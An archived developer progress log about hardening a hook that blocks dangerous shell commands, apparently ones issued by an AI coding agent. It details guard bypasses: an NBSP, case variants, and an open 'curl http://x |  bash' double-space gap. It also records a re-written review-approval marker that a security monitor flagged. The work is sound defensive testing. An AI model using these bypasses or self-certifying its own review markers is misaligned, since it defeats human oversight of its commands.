# Archived Progress — `dangerous-commands.sh`/`.ps1` Git-Merge CONFIRM Hardening (2026-08-18, Task #30)

Archived from `memory-bank/progress.md` on 2026-08-18 to bring that file back under its
400-line CI-enforced limit. Condensed pointer left in place there; nothing operationally
open was dropped — see `activeContext.md`'s Next Steps for current state.

## `dangerous-commands.sh`/`.ps1` Git-Merge CONFIRM Hardening (Task #30, committed `499dbe5`)

- ✅ **Closed the `git merge`-into-shared-branch CONFIRM gap** `standards/SECURITY-GUARDRAILS.md:114` had
  documented but never enforced (only the closely analogous `gh pr merge` was denied). Added
  `confirm_boundary()` to `dangerous-commands.sh` and a regex entry to `dangerous-commands.ps1`'s
  `$confirmPatterns`. Went through this repo's full 5-domain `/code-review` + Opposition discipline,
  **twice** — each round caught real defects the prior round (including the original implementation)
  missed:
  - **Round 1 (Bug Scan, confirmed independently by two subagents):** the first version only bounded the
    *trailing* side of the match — `git commit -m "legit merge of feature A"` false-positive-matched as a
    substring of "legit **merge**" containing "**git** merge" via "le**git merge**". Fixed with a two-sided
    boundary (start-of-string-or-non-letter on the leading side too) on both scripts.
  - **Round 2 (Correctness, VERIFIED via direct execution, not just hand-tracing):** bash's `[[:space:]]`
    and PowerShell's `\s` disagreed on Unicode whitespace — an NBSP (U+00A0) substituted for the space
    after "merge" bypassed the guard on bash but was still caught by PowerShell's Unicode-aware `\s`. The
    reviewer caught this only by going one step past hand-tracing 7 cases (all agreed) and actually
    executing both engines against an adversarially-chosen probe input. Fixed by normalizing tabs to
    spaces in `$cmd` up front on both sides and simplifying both boundary checks to a literal space —
    removing the character-class parity requirement entirely rather than trying to keep two different
    regex-engine whitespace classes in sync.
  - **Opposition (BLOCK, then re-reviewed to APPROVE):** the fix initially landed only in `scripts/`, never
    in `templates/scripts/` — this repo's own established "canonical adoptable surface" (per `scripts/mb.sh`'s
    `invoke_upgrade`/`TEMPLATE_OWNED` logic around line 1723, which propagates both copies) that `mb upgrade`
    copies into every adopting project. Three
    prior commits (`cb47f45`, `bd47244`, `980bc16`) had each modified both copies together, establishing
    the convention; this diff broke it, and neither of the two full domain-review rounds caught it because
    every review job is scoped to the diff, and a missing mirror update is definitionally absent from what
    got reviewed. The opposition reviewer's "what wasn't reviewed that could matter" mandate is what
    surfaced it, not deeper scrutiny of the same diff. Also caught in the same pass, "strongly
    recommended" alongside the block: an sh/ps1 case-sensitivity divergence — an uppercase-executable-name
    variant of the guarded command (a genuinely executable command on Windows: the filesystem resolves the
    exe name case-insensitively, the subcommand argument itself only needs to stay lowercase) was denied
    by PowerShell's case-insensitive regex but silently allowed by bash's case-sensitive glob. Fixed by
    case-folding both sides of `confirm_boundary()`'s comparison.
  - Both `docs/HOOKS-GUIDE.md` and `templates/docs/HOOKS-GUIDE.md` had a stale CONFIRM-tier table (still
    listing `TRUNCATE TABLE`/`DELETE FROM`, removed from the actual scripts in an unrelated earlier commit
    with nothing catching the doc going stale; never listing the new pattern) — corrected in both.
  - New `tests/dangerous-commands.Tests.ps1` (13 tests) is this hook's first-ever automated PowerShell-side
    coverage; `tests/test-dangerous-commands.sh` gained matching regression tests for every fix above (16
    assertions total per its own `Results:` output, up from 8 pre-existing).
  - Re-review (Opposition #2) independently re-ran both test suites and a 26-case sh-vs-ps1 parity
    harness itself, confirmed zero divergence remaining on any git-merge-shaped input, and surfaced 4 more
    non-blocking findings for later: **F1 (High, VERIFIED but confirmed pre-existing via `git show HEAD`,
    not introduced by this diff)** — `curl http://x |  bash` (two spaces) bypasses the BLOCK tier on bash
    but not PowerShell, same defect *class* as the fixes above, living in different, untouched lines; F2
    (Low) — `docs/HOOKS-GUIDE.md` says "BLOCK (19 patterns)" but lists 18, pre-existing; F3 (Info) — the
    guard is broader than `SECURITY-GUARDRAILS.md:114`'s literal scope (any `git merge`, not just
    onto-a-branch-with-a-remote-or-PR), stricter direction, not a problem; F4 (Medium) — a few unrealistic
    `git merge` forms (mid-line via `;`/newline, double-spaced) still slip through, but consistently on
    both platforms, and the realistic/documented shape is caught. None fixed this round — F1 is real but
    genuinely out of this diff's scope; logged as a new backlog item rather than expanding Task #30.
- 🔴 **Live-reproduced the still-pending "marker-destruction-on-denial" bug** (already tracked, not
  previously seen fire for real in this session). Sequence: Opposition round 2 approved and wrote
  `.claude/.code-review-ok` (hash `f493d346ac2c...`, independently re-verified matching by direct
  recomputation). The following `git commit` attempt was DENIED by `dangerous-commands.sh` — the commit
  message itself quoted the guarded phrase as a literal example ("GIT merge main"), which the very guard
  just approved correctly caught. That denial had a side effect: `.claude/.code-review-ok` was gone
  afterward even though the commit never ran and the working tree never changed — `review-reminders.sh`'s
  marker-consuming logic fired despite the `PreToolUse` denial. Resolved by resuming the *same* Opposition
  agent (not a fresh self-review) to confirm the working tree was still byte-identical to what it had
  already reviewed, then re-write the marker via the standard command — reproduced the identical hash,
  independently reconfirmed a third time. A harness-level security monitor flagged that marker-write as a
  possible self-certification pattern; walked the user through the verification evidence directly (three
  independent hash computations agreeing, no content change) before committing. This is now a concrete,
  reproducible incident to work from when Task #33 is actually fixed, rather than a theoretical
  description.
- 📌 **Work-MB findings doc** (`C:\Users\Mizzo\Downloads\PMB-Findings-for-Work-MB.md`) — added **Document
  8** covering the two findings above (templates/ mirror gap missed by diff-scoped review; the "parity"
  comment that was wrong twice, only caught by direct adversarial execution not hand-tracing) plus a third
  part checking this project's own global-CLI-install path for the same staleness-gap *class* a sibling
  project's tooling had just been found to have (npm-link vs. stale-registry-copy) — verified clean: the
  global `mb` command is a thin wrapper reading `MB_HOME` and invoking `scripts/mb.ps1` directly from the
  live repo path, no intermediate copy, no publish step, structurally the safe pattern.
- ✅ **All 3 test-coverage gaps closed (Task #32, committed `2991093`):**
  - `tests/test-mb-version-notifier.sh`: proves `get_cached_pmb_version()`'s `tr -d '[:space:]"'`
    sanitization actually protects the hand-built cache JSON, and that the written file round-trips
    on a subsequent read. First draft's round-trip assertion pointed the second invocation at the
    still-live test server, so a broken cache reader could be silently masked by a live-fetch
    fallback applying the same sanitization — caught independently by both the Testing and
    Correctness domain reviewers on the same review pass. Fixed by pointing the second invocation
    at an unreachable port; the opposition reviewer mutation-tested the fix directly (a corrupted
    cache file now genuinely fails the assertion; a valid one still passes in ~400ms since the
    cache-hit branch short-circuits before ever calling curl).
  - `tests/test-mb-clean.sh`: replaced `assert_contains "$output" "slim"` (trivially satisfied by
    every invocation, since "Slim Check" is an unconditional header) with assertions tied to
    `show_clean()`'s actual line-count branches for `progress.md`, plus new coverage for the
    previously-untested 250–400-line "RECOMMENDED" middle branch.
  - `tests/test-review-reminders.sh`: adds PowerShell-side coverage for the chained-cd and
    whitespace-variant root-resolution fixes (`Resolve-CdRoot`), previously bash-only despite being
    security-relevant on both platforms. First draft's new tests failed for a subtle reason: testing
    a native PowerShell process requires real Windows paths with escaped backslashes, not the
    POSIX-style paths bash's own `mktemp` produces — an unescaped backslash inside a JSON string is
    a valid-but-wrong JSON escape sequence (e.g. `\t` in `\tmp.XXXX` decodes to a literal tab),
    silently corrupting the path before `Resolve-CdRoot` ever sees it. This read exactly like a real
    security bypass (a decoy repo's marker appeared to authorize a commit in a different repo) until
    traced back to the test's own JSON construction via an isolated `Resolve-CdRoot` call proving the
    function itself was correct given a real Windows path. Fixed via a new `win_path_for_json()` test
    helper (`cygpath -w` + backslash-doubling), gated on `cygpath` being present so its absence
    produces a clean SKIPPED line rather than a spurious FAIL.
  - The opposition reviewer also independently root-caused an unrelated single-run "9 failed" result
    (from a manual re-run during this same session) as a pre-existing, environment-level test-server
    readiness-poll flake (the poll exhausts 10 attempts and proceeds anyway) — reproduced
    deterministically by neutering the server-launch line, confirmed unrelated to this diff.
